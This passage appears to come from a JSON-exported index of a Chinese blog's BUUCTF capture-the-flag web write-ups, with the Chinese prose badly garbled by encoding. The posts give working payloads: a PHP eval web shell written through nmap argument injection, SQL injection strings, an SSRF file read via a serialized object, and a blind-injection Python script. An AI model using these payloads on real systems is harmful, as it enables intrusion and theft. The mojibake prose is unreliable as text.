åæ–œçº¿ï¼Œç„¶åå°†å•å¼•å·åˆ†å‰²çš„å‡ éƒ¨åˆ†ï¼Œéƒ½ç”¨å•å¼•å·æ‹¬èµ·æ¥****\n****escapeshellcmdä¼šå°†&#;`|\\*?~<>^()[]{}$\\, \\x0A å’Œ \\xFFä»¥åŠä¸é…å¯¹çš„å•/åŒå¼•å·è½¬ä¹‰**\n\nä¸¾ä¸ªä¾‹å­\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341140.png)\n\næ³¨æ„è¿™é‡Œç¯å¢ƒä¸€å®šè¦åœ¨linuxæ‰è¡Œ å¦‚æœç¯å¢ƒåœ¨windowä¼šå‡ºç°ä»¥ä¸‹æƒ…å†µï¼Œç›®å‰è¿˜æ²¡å¼„æ‡‚æ˜¯å•¥åŸå› \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341179.png)\n\nè¿™æ ·å½“è¿™ä¸¤ä¸ªå‡½æ•°æ··åˆåœ¨ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œå°±ä¼šå¯¼è‡´ï¼Œè½¬ä¹‰çš„å•å¼•è¢«ç»•è¿‡ã€‚\n\næœ‰äº†è‘—åçš„æ¼æ´ é™„ä¸Šå¤§ä½¬çš„é“¾æ¥å­¦ä¹  https://paper.seebug.org/164/\n\né¢˜ç›®ä¸­ç»™å‡ºçš„æ˜¯nmapå‘½ä»¤ï¼Œæ‹¼æ¥ä¸Šæˆ‘ä»¬å¯æ§çš„å‚æ•°$hostï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡æ·»åŠ nmapå‚æ•°æ‰§è¡Œå°†å‘½ä»¤å’Œç»“æœå†™å…¥æ–‡ä»¶çš„æ“ä½œï¼Œå†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚ç›®å‰è¿˜æ²¡æœ‰å­¦ä¹ åˆ°nmapï¼Œæš‚æ—¶å…ˆä¸è§£é‡Šã€‚\n\nnmapå†™å…¥æ–‡ä»¶çš„å‚æ•°æ˜¯ -oG\n\n\n\nmkdir ()â€” æ–°å»ºç›®å½•\n\nchdir ()â€” æ”¹å˜ç›®å½•\n\næ„é€ peyload\n\n```\n?host='<?php @eval($_POST[x]); ?> -oG 1.php '` æ³¨æ„æ­¤å¤„æœ‰ç©ºæ ¼ å½“æ—¶ä¸€ç›´æ²¡åšå‡ºæ¥ è¦æœ‰ç©ºæ ¼ ä¸ç„¶nmapæ‰§è¡Œåé¢çš„æ–‡ä»¶å°±ä¼šå˜æˆ `1.php//\n```\n\nç»è¿‡ä¸¤æ¬¡å‡½æ•°ä¹‹å\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341131.png)\n\n```\n''\\\\''\\<\\?php @eval\\(\\$_POST\\[\"hack\"\\]\\)\\;\\?\\>  -oG 1.php '\\\\'''\n```\n\nå›¾ç‰‡ä¸çŸ¥é“ä¸ºå•¥æŠŠæˆ‘evalä¸­çš„å†…å®¹åäº†ä¸çŸ¥é“ä¸ºå•¥\n\nç›¸å½“äº\n\n```\n\\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\n```\n\nç›¸å½“äºæ‰§è¡Œäº† \n\n```\nsystem(\"nmap -T5 -sT -Pn --host-timeout 2 -F \\\\ <?php @eval($_POST[x]); ?> -oG 1.php \\\\\")\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341212.png)\n\näº§ç”Ÿçš„æ–‡ä»¶å¤¹å è¢«md5åŠ å¯†äº†\n\nä¹‹åè®¿é—®çš„æ—¶å€™åŠ ä¸Šå°±è¡Œ\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082341036.png)\n\næ„Ÿæ‚Ÿ: nmapè¿˜ä¸€ç‚¹éƒ½æ²¡æœ‰å­¦ä¹ ï¼Œåšè¿™ä¸ªé¢˜è´¹äº†å¥½å¤§åŠ²ï¼Œä¹‹åæœ‰ç©ºè¦å»æ¶‰ç•¥ä¸€ä¸‹nmapã€‚\n","tags":["nmap","$_SERVER","esc***å‡½æ•°"],"categories":["buuctf"]},{"title":"buuctf 35-[BJDCTF2020]The mystery of ip","url":"/post/a4341e77.html","content":"\nbuuctf [BJDCTF2020]The mystery of ip\n\n<!--more-->\n\nè¿™é“é¢˜è€ƒåˆ°äº†æ¨¡æ¿æ³¨å…¥ç®€å•è®°å½•ä¸€äº›å§  å‚è€ƒï¼šhttps://houbb.github.io/2020/08/09/web-safe-12-ssti\n\næœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜.  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342348.png)\n\nè·å–åˆ°äº†æˆ‘ä»¬çš„ipï¼Œç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°äº†ä¿®æ”¹xff\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342770.png)\n\nä½†æ˜¯æ²¡å•¥ç”¨ æ€è·¯å¤§æ¦‚æ˜¯å°±æ˜¯åˆ©ç”¨xff è¿›è¡Œæ¶æ„è¯»å–å§ çœ‹äº†wp æ˜¯phpçš„smartyæ¨¡æ¿æ³¨å…¥ å‚è€ƒï¼šhttps://www.anquanke.com/post/id/272393\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342128.png)\n\nä»£ç ç›´æ¥è¿è¡Œäº† äºæ˜¯ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œå°±è¡Œ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082342033.png)\n\nç›´æ¥è¯»æ ¹ç›®å½•flagæ–‡ä»¶å°±è¡Œäº†\n","tags":["æ¨¡æ¿æ³¨å…¥","xff","smartyæ¨¡æ¿"],"categories":["buuctf"]},{"title":"buuctf 34-[RoarCTF 2019]Easy Java","url":"/post/d05894c4.html","content":"\nbuuctf 34-[RoarCTF 2019]Easy Java\n\n<!--more-->\n\nå¼±å£ä»¤èƒ½çˆ†å‡ºæ¥ï¼š\n\nè´¦å·:admin\n\nå¯†ç : admin888\n\nä½†æ˜¯æ²¡å•¥ç”¨ è¿˜æ˜¯æ‰€ä»¥åªå‰©ä¸‹ç™»å½•é¡µé¢çš„å¸®åŠ©äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343030.png)\n\nè¿™é‡Œè€ƒåˆ°äº†java çš„ WEB-INF çŸ¥è¯†ç‚¹ å‚è€ƒï¼šhttps://www.cnblogs.com/shamo89/p/9948707.html\n\nä½†æ˜¯è¿™é‡Œé€šè¿‡getæ–¹å¼ä¼ å‚æ˜¯ä¸è¡Œçš„ åªèƒ½é€šè¿‡post\n\næ„é€  payloadï¼š `filename=WEB-INF/web.xml`\n\nWEB-INF/web.xml  ï¼š Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™   å¯ä»¥æ‰¾åˆ°flagçš„ä½ç½®ä»¥åŠå‘½åæ–¹å¼\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343221.png)\n\næ‰¾åˆ°äº†flagçš„åœ°å€ ä»¥åŠä»–çš„å‘½åæ–‡ä»¶\n\nç§‰æŒjava ä¸‡ç‰©éƒ½æ˜¯ç±»çš„åŸåˆ™ è¦è¯»å–flag å°±è¦è¯»è¿™ä¸ªflagç±»\n\nWEB-INF/classes/\n\n åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰  \n\næ„é€ payload ï¼š`filename=WEB-INF/classes/com/wm/ctf/FlagController.class`ä¸è¦å¿˜äº†classåç¼€ ä¸€å¼€å§‹å°±å¿˜äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082343109.png)\n\nè§£ç  å¾—åˆ°flagï¼\n","tags":["å¼±å£ä»¤","java"],"categories":["buuctf"]},{"title":"buuctf 33-[ç½‘é¼æ¯ 2018]Fakebook","url":"/post/c6fe9d66.html","content":"\nbuuctf [ç½‘é¼æ¯ 2018]Fakebook\n\n<!--more-->\n\næ—¥å¸¸è®¿é—®robots.txtæ–‡ä»¶\n\n robots.txt æ–‡ä»¶è§„å®šäº†æœç´¢å¼•æ“æŠ“å–å·¥å…·å¯ä»¥è®¿é—®æ‚¨ç½‘ç«™ä¸Šçš„å“ªäº›ç½‘å€ã€‚  \n\nå‘ç°æœ‰ä¸ªæ–‡ä»¶å¯ä»¥æ‰“å¼€\n\né™„ä¸Šæºç ï¼š\n\n```plain\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n```\n\næ˜¯ä¸€ä¸ªphpå†™çš„ç±» ç„¶åç”¨äº†curl\n\ncurl:https://blog.csdn.net/yangyu112654374/article/details/4658854\n\nç„¶åå‘ç°æœ‰ `$output = curl_exec($ch)` å¯ä»¥å°†ç±»ä¸­`blog`é‡æ–°æ„é€ ç”¨æ¥æ‰§è¡Œssrfæ¼æ´\n\nhttps://xz.aliyun.com/t/11215 ç›´æ¥çœ‹å¤§ä½¬çš„æ€»ç»“\n\nç”³è¯·ä¸€ä¸ªè´¦å·è¿›å…¥å¯ä»¥çœ‹åˆ°å­˜åœ¨sqlæ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344592.png) \n\nåˆ¤æ–­æ˜¯ä»€ä¹ˆç±»å‹æ³¨å…¥\n\n`no=1 and 1=1#` å¯ä»¥\n\n`no=1 and 1=2#` ä¸è¡Œ\n\nè¯´æ˜è¿™æ˜¯æ•°å­—æ³¨å…¥\n\n`?no=0 order by 4#`  å››åˆ—\n\næŠ¥é”™æ³¨å…¥(è¿™é‡Œæ¯”è¾ƒæ¨èæŠ¥é”™ è”åˆæŸ¥è¯¢çš„è¯ä¸€å¼€å§‹æ‰¾ä¸åˆ°å›æ˜¾ç‚¹ å¯èƒ½æ˜¯æˆ‘çœ¼ç)\n\nå…¶å®æ˜¯è¿‡æ»¤äº† `union select` ç”¨`union/**/select` ç»•è¿‡å°±è¡Œ\n\n`1 and updatexml(1,concat('~',database(),'~'),3)#` æ³¨æ„~ ä¸èƒ½ç”¨åå…­è¿›åˆ¶çš„ 0x7e è¿™é‡Œæœ‰æ£€æµ‹ ç”¨å›åŸå‹å¥½å°±è¡Œ\n\n[*] query error! (XPATH syntax error: '~fakebook~')\n\n```\n1 and updatexml(1,concat('~',select user(),'~'),3)# \n```\n\nè”åˆæ³¨å…¥\n\n```\n?no=-1 union/**/select 1,database(),3,4#\n```\n\nfakebook\n\n```\n?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'#\n```\n\nusers\n\n```\n?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#\n```\n\nno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS\n\n `?no=-1 union/**/select 1,group_concat(no,username,passwd,data),3,4 from users#`\n\n 1admin3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:11:\"www.123.com\";}\n\n åˆ©ç”¨ssrfæ¼æ´ è¯»å–å†…å®¹\n\næ„é€ ç±»é‡Œçš„ blogå±æ€§å€¼ä¸º `s:29:\"file:///var/www/html/flag.php\"`\n\n æ„é€ payload: `?no=-1 union/**/select 1,2,3,'O:8:\"UserInfo\":3:{s:4:\"name\";s:5:\"admin\";s:3:\"age\";i:1;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'`\n\nå¾—åˆ°base64ç \n\n```\nPD9waHANCg0KJGZsYWcgPSAiZmxhZ3s1MTkzODdkNS02OWQ2LTQ0OGEtYWQyZS0wODgxYmJkOThiNDl9IjsNCmV4aXQoMCk7DQo=\n```\n\n<?php\n\n\n\n$flag = \"flag{519387d5-69d6-448a-ad2e-0881bbd98b49}\";\n\nexit(0);\n\n\n\næ³•äºŒï¼š\n\n```\n?no=-1 union/**/select 1,load_file('/var/www/html/flag.php'),3,4#\n```\n\nä¹‹å‰çœ‹åˆ°ç”¨æˆ·æ˜¯ç®¡ç†å‘˜ æ‰€ä»¥è”æƒ³åˆ°ç”¨load_fileå‡½æ•°\n\nå»è¿™é‡Œçœ‹https://www.cnblogs.com/junlebao/p/14104036.html\n","tags":["sqlæ³¨å…¥","robots.txt","ååºåˆ—åŒ–","curl","ssrf"],"categories":["buuctf"]},{"title":"buuctf 32-[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World","url":"/post/3b320c12.html","content":"\nbuuctf CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World\n\n<!--more-->\n\nè¿™é“é¢˜æ˜¯ä¸€é“æ¯”è¾ƒç»å…¸çš„å¸ƒå°”ç›²æ³¨çš„é¢˜ç›®ï¼Œä¹Ÿå°±å…¨å½“ä½œæ˜¯å­¦ä¹ äº†ã€‚\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344880.png)\n\né¢˜ç›®è¡¨ç¤ºflagåœ¨flagè¡¨é‡Œçš„flagå­—æ®µé‡Œ è¿™ç‚¹å°±å¾ˆå¯ç–‘\n\nè¾“å…¥ 1ï¼Œ2éƒ½æœ‰æ­£ç¡®çš„å›æ˜¾\n\nè¾“å…¥`1'`æ—¶æ˜¾ç¤º\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344854.png)\n\næ˜¾ç¤ºå¸ƒå°”ï¼ˆé”™è¯¯ï¼‰ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ¤æ–­æ˜¯å¸ƒå°”æ³¨å…¥äº†\n\nå¥½å¥½å­¦ä¹ ä¸€ä¸‹å¸ƒå°”ç›²æ³¨çš„çŸ¥è¯†ï¼š\n\nè¿™é‡Œæœ‰ç¯‡å¸ƒå°”ç›²æ³¨çš„çš„æ–‡ç« ï¼šhttps://blog.csdn.net/wangyuxiang946/article/details/123486880 å¯ä»¥å­¦ä¹ å­¦ä¹ \n\nsubstr(string,å¼€å§‹1ï¼Œé•¿åº¦)å‡½æ•° ç”¨äºæˆªå–å­—ç¬¦ä¸²çš„éƒ¨åˆ†å­—ç¬¦ä¸²\n\nasscii() ç”¨äºå°†å­—ç¬¦è½¬åŒ–æˆasciiç¼–ç \n\nè¿™é‡Œæœ¬åœ°æ­äº†ä¸€ä¸ªç¯èŠ‚æµ‹è¯•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344816.png)\n\nåœ¨é¢˜ç›®æµ‹è¯•ä¸€ä¸‹\n\n```\nselect ascii(substr((select flag from flag),1,1))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344111.png)\n\nå‘ç°è¢«è¿‡æ»¤äº† fuzzä¸€ä¸‹å“ªäº›è¢«è¿‡æ»¤äº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344901.png)\n\nå‘ç°ä¸€äº›å¸¸ç”¨çš„ ç©ºæ ¼ `or union` éƒ½è¢«è¿‡æ»¤äº† `/**/`ç»•è¿‡ç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº† æ‰€ä»¥åªèƒ½ç”¨`()`æ¥ç»•è¿‡\n\næ„é€ payloadï¼š\n\n```\nselect(ascii(substr((select(flag)from(flag),1,1)))\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344886.png)\n\næ­£å¸¸å›æ˜¾äº†\n\nè¿™é‡Œå†ç”¨åˆ°mysql çš„ifè¯­å¥\n\nif(æ¡ä»¶ï¼ŒæˆåŠŸå›æ˜¾ï¼Œå¤±è´¥å›æ˜¾)\n\næœ¬åœ°æµ‹è¯•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344175.png)\n\nè¿™æ˜¯ä¸ºä»€ä¹ˆæ¡ä»¶ç­‰äº84 æ˜¯å› ä¸º æˆ‘æœ¬åœ°flagçš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºT asciiç¼–ç ä¸º84\n\næ„é€ payloadï¼š`if(ascii(substr((select(flag)from(flag)),1,1))=102,1,0)`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344201.png)\n\næˆåŠŸå›æ˜¾ è‡³äºä¸ºä»€ä¹ˆæ˜¯102 å› ä¸ºflagå¼€å¤´f çš„asciiç¼–ç ä¸º102\n\né‚£ä¹ˆå°±å¯ä»¥å€ŸåŠ©è„šæœ¬ï¼Œè¿™é‡Œå› ä¸ºæˆ‘pythonæ²¡æ€ä¹ˆå­¦ï¼Œè„šæœ¬ä¸ä¼šå†™\n\nä½†æ˜¯æ•´ä½“è„šæœ¬æ€è·¯ä¸º å½“åŒ¹é…å­—ç¬¦ascii ä¸é¢˜ç›®ç›¸åŒæ—¶å›æ˜¾1 å¦åˆ™å›æ˜¾0 è„šæœ¬æ ¹æ®é¢˜ç›®å›æ˜¾çš„è¯­å¥è¿›è¡Œåˆ¤æ–­\n\nç„¶åéå†æ•´ä¸ª32-126 asciiç¼–ç å­—ç¬¦\n\nè¿™é‡Œæ”¾ä¸€ä¸‹å¤§ä½¬çš„è„šæœ¬ï¼š\n\n```python\nimport requests\nimport time\nimport re\nurl='http://4fdaca11-2d67-4dbe-b046-a42e64af5917.node4.buuoj.cn:81/index.php'\nflag = ''\nfor i in range(1,43):\n    max= 127\n    min = 0\n    for c in range(0,127):\n        s = (int)((max+min)/2)\n        payload = '0^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'\n        r = requests.post(url,data = {'id':payload})\n        time.sleep(0.005)\n        if 'Hello, glzjin wants a girlfriend.' in str(r.content):\n            min=s\n        else:\n            max=s\n        if((max-min)<=1):\n            flag+=chr(max)\n            print(flag)\n            break\n```\n\nä»¥åæœ‰æ—¶é—´è¦æ»šå»å­¦ä¹ å†™å†™è„šæœ¬äº†qwq\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082344220.png)\n","tags":["sqlæ³¨å…¥","è„šæœ¬"],"categories":["buuctf"]},{"title":"buuctf 31-[GYCTF2020]Blacklist","url":"/post/a8bde72c.html","content":"\nbuuctf [GYCTF2020]Blacklist\n\n<!--more-->\n\nè¿™é“é¢˜åˆæ˜¯ä¸€é“å­¦ä¹ çš„é¢˜ç›®ï¼Œæ‰“å¼€çœ‹åˆ°ç•Œé¢uiå¾ˆåƒä¸€é“å †å æ³¨å…¥çš„é¢˜ç›®ï¼Œåˆšå¥½è¿™é“é¢˜ä¹Ÿæ˜¯ç”¨å †å æ³¨å…¥\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345646.png)\n\næŸ¥å­—æ®µï¼š`1' order by 3#`\n\n`error 1054 : Unknown column '3' in 'order clause'` åªæœ‰ä¸¤åˆ—\n\nè¿™é“é¢˜è¿‡æ»¤äº† \n\n```\nreturn preg_match(\"/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i\",$inject);\n```\n\nä¸èƒ½ç”¨é¢„ç¼–è¯‘ select æŠ¥é”™æ³¨å…¥åº”è¯¥æ˜¯\n\n```\n1'; show databases#\n```\n\n\"supersqli\"\n\n```\n1'; show tables#\n```\n\n\"FlagHere\"\n\n```\n1';show columns from FlagHere#\n```\n\nç›´æ¥ç”¨`1';desc FlagHere#`ä¹Ÿå¯ä»¥\n\n  string(4) \"flag\"\n\ndescç”¨æ³•ï¼š\n\n1.æŸ¥è¡¨çš„è¯¦ç»†ä¿¡æ¯  egï¼š`desc table_name;`\n\n2.descé™åºæ’åˆ—æ•°æ®  eg: `select select ename,sal from emp order by sal desc; `\n\næ‰‹åŠ¨æŒ‡å®šæŒ‰ç…§è–ªæ°´ç”±å¤§åˆ°å°æ’åºï¼ˆé™åºå…³é”®å­—descï¼‰\n\nç„¶åè¿™é‡Œç”¨åˆ°äº† mysql handlerè¯­å¥æŸ¥è¯¢å­—æ®µå†…çš„ä¿¡æ¯\n\nè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®\n\nä¸‹é¢åœ¨æœ¬åœ°æ­äº†ä¸€ä¸ªç¯å¢ƒè¿›è¡Œæµ‹è¯• å¦‚ä¸‹ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345725.png)\n\nä¹‹åå°±å¯ä»¥æ„é€ payloadï¼š\n\n```\n1';HANDLER FlagHere open;HANDLER FlagHere read first;HANDLER FlagHere close;# \n```\n\næˆåŠŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345650.png)\n","tags":["sqlæ³¨å…¥","å †å æ³¨å…¥","handlerç”¨æ³•"],"categories":["buuctf"]},{"title":"buuctf 29-[GXYCTF2019]BabySQli","url":"/post/b32b8b53.html","content":"\nbuuctf [GXYCTF2019]BabySQli\n\n<!--more-->\n\næŠ“åŒ…å‘ç°ä¸€ä¸²å¯†æ–‡ï¼š\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346082.png)\n\n`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5` è¿™æ˜¯ä¸€ä¸²base32ç¼–ç ï¼Œbase32ç¼–ç ç‰¹å¾æ˜¯åªæœ‰å¤§å†™å­—æ¯å’Œæ•°å­—\n\nè§£å¯†åï¼š`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==` è¿™æ˜¯ä¸€ä¸²base64ç¼–ç ï¼Œbase64ç¼–ç ç‰¹ç‚¹æ˜¯æœ‰å¤§å°å†™å­—æ¯å’Œæ•°å­—è€Œä¸”æœ«å°¾å¸¸å¸¸æ˜¯ç­‰äºå·\n\nè§£ç  å¾—åˆ°ï¼š`select * from user where username = '$name'`\n\næ„æ€æ˜¯è®©æˆ‘ä»¬ä»ç™»å½•åè¿›è¡Œæ³¨å…¥\n\nè¿™ä¸ªé¢˜ç›®è¿‡æ»¤äº†è›®å¤šå¸¸ç”¨æŸ¥è¯¢å­—ç¬¦ï¼Œå¯ä»¥bpæŠ“åŒ… fuzzä¸€ä¸‹\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345905.png)\n\næ˜¾ç¤º419å°±æ˜¯è¢«æ²³èŸ¹çš„ 415å°±æ˜¯æ­£å¸¸å›æ˜¾\n\nè¿‡æ»¤äº† å¸¸ç”¨çš„`or``ï¼ˆï¼‰` ç„¶åå¯ä»¥å¤§å†™ç»•è¿‡\n\næ„é€ `1' Order by 4#` å‘ç°æŠ¥é”™åªæœ‰ä¸‰åˆ—\n\nè¿™é‡Œå†æä¾›ä¸€ç§selectæŸ¥è¯¢çˆ†å­—æ®µçš„æ–¹æ³•\n\n`select 1,2#` æŠ¥é”™ `select 1,2,3#` æ­£å¸¸å›æ˜¾ä¹Ÿå¯ä»¥ç”¨æ¥åˆ¤æ–­å­—æ®µæ•°\n\nç„¶åå°±ä¸ä¼šäº† çœ‹äº†å…¶ä»–å¤§ä½¬çš„wp\n\nè¿™é‡Œåˆ©ç”¨äº†ä¸€ä¸ªmysqlè”åˆæŸ¥è¯¢çš„ç‰¹æ€§ï¼š\n\n**unionåšæŸ¥è¯¢æ—¶ï¼ŒæŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆè”åˆæŸ¥è¯¢å°±ä¼šåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®å­˜æ”¾åœ¨æ•°æ®åº“ä¸­**\n\nå…·ä½“å¯ä»¥çœ‹è¿™ç¯‡å¤§ä½¬çš„è¯¦ç»†wpï¼šhttps://www.tqwba.com/x_d/jishu/272679.html\n\nç”±äºåªèƒ½é€šè¿‡adminè´¦æˆ·,å› æ­¤è®©è™šæ‹Ÿç”¨æˆ·çš„åå­—æ˜¯admin åŒæ—¶å¯†ç è½¬æ¢æˆäº†md5å­˜å‚¨(çŒœæµ‹åº”è¯¥æ˜¯ä¸ºäº†ä¿æŠ¤ç”¨æˆ·çš„éšç§,md5ä¸å¯é€†,è¿™å°±è®©å³ä½¿èº«ä¸ºç®¡ç†å‘˜ä¹Ÿä¸èƒ½çŸ¥é“ç”¨æˆ·å¯†ç )äºæ˜¯åœ¨æ„é€ çš„æ—¶å€™è¦æ³¨æ„æ•°æ®åº“å¯†ç åº”è¯¥æ˜¯md5æ¨¡å¼çš„.åŒæ—¶ç™»å…¥æ—¶è¾“å…¥å¯¹åº”çš„æ˜æ–‡å¯†ç å³å¯ã€‚\n\n æ„é€ ï¼š`name=123'union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1`\n\nå…¶ä¸­ md5å€¼ä¸º1çš„md5å€¼ï¼Œè¿™é‡Œå°±æ˜¯æ„é€ äº† å½“åå°æ£€æµ‹`1 = mdï¼ˆ1ï¼‰`æ—¶ä¸ºçœŸ æˆåŠŸç™»å½•\n\nå…¶å®å°±æ˜¯ åå°å»æŸ¥æ‰¾ç¬¦åˆå¯†ç ä¸º1çš„md5å€¼  ä½†æ˜¯æœ¬æ¥æ²¡æœ‰ æˆ‘ä»¬åˆ©ç”¨è”åˆæŸ¥è¯¢ç‰¹æ€§æ„é€ äº†ä¸€ä¸ªæ— ä¸­ç”Ÿæœ‰ äºæ˜¯èƒ½æˆåŠŸç™»å½•\n","tags":["sqlæ³¨å…¥","è”åˆæŸ¥è¯¢ç‰¹æ€§","base32"],"categories":["buuctf"]},{"title":"buuctf 25-[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL","url":"/post/58b11103.html","content":"\nbuuctf [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQ\n\n<!--more-->\n\nè¿™ä¸ªé¢˜ç›®æ˜¯æŠ¥é”™æ³¨å…¥çš„å…¸å‹ï¼Œå€¼å¾—è®°å½•ä¸€ä¸‹\n\nç®€å•å°è¯•ä¹‹åå¸¸è§çš„å­—ç¬¦æ¯”å¦‚ç©ºæ ¼ unionéƒ½è¢«é»‘åå•äº† å°è¯•ç”¨/**/ç»•è¿‡ç©ºæ ¼ä½†è¿˜æ˜¯ä¸è¡Œï¼Œåªèƒ½ç”¨ï¼ˆï¼‰æ¥ç»•è¿‡ç©ºæ ¼\n\nè¿™é‡Œæµ‹è¯•ç©ºæ ¼æ˜¯å¦è¢«æ²³èŸ¹ ä¸èƒ½é€šè¿‡1'åŠ ç©ºæ ¼ è¿™æ ·æµ‹è¯•æ˜¯ä¸å¯¹çš„\n\næœ€å¥½æ˜¯ç”¨`1' #`è¿™æ ·æµ‹è¯•æ¯”è¾ƒæ­£ç¡®ï¼Œå› ä¸ºä¸€èˆ¬é¢˜ç›®ä¸ä¼šæ²³èŸ¹#å­—ç¬¦\n\nç©ºæ ¼ç»•è¿‡çš„åŸç†ï¼š 